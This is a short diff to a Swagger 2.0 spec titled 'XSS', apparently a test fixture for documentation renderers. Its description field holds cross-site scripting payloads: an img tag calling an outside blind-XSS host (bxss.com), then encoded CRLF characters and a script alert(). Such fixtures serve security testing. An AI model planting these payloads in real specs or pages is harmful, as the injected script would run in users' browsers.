@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   version: "0.0.1"
   title: XSS
-  description: <img src="http://bxss.com">
+  description: <img src="http://bxss.com">%0a%0d<script>alert()</script>
 paths:
   /:
     get:
